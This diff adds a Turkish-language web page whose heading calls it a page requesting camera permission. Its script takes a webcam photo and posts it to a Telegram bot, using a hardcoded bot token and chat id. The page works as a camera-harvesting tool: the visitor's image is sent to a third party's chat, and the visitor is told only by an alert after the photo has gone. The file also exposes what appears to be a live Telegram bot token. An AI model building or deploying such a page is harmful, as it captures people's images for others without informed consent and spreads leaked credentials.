@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fotoğraf Yakalama</title>
+</head>
+<body>
+<h2>Kamera İzni İsteyen Sayfa</h2>
+
+<button id="startCam">Kamerayı Aç</button>
+<br /><br />
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<br />
+<button id="capture" style="display:none;">Fotoğraf Çek</button>
+<br /><br />
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const startCam = document.getElementById('startCam');
+const capture = document.getElementById('capture');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+const botToken = '7715203894:AAGhkXZZqViXKEnGc_l5Xe7s-jdwqwCrLwY';
+const chatId = '8053934312';
+
+startCam.onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    video.style.display = 'block';
+    capture.style.display = 'inline-block';
+  } catch (err) {
+    alert('Kamera izni reddedildi veya hata oluştu.');
+  }
+};
+
+capture.onclick = () => {
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/png'); // base64 formatında fotoğraf
+
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+  fetch(url, {
+    method: 'POST',
+    body: new URLSearchParams({
+      chat_id: chatId,
+      photo: imageData
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.ok) alert('Fotoğraf Telegram\'a gönderildi!');
+    else alert('Fotoğraf gönderilemedi.');
+  })
+  .catch(() => alert('Gönderirken hata oluştu.'));
+};
+</script>
+</body>
+</html>
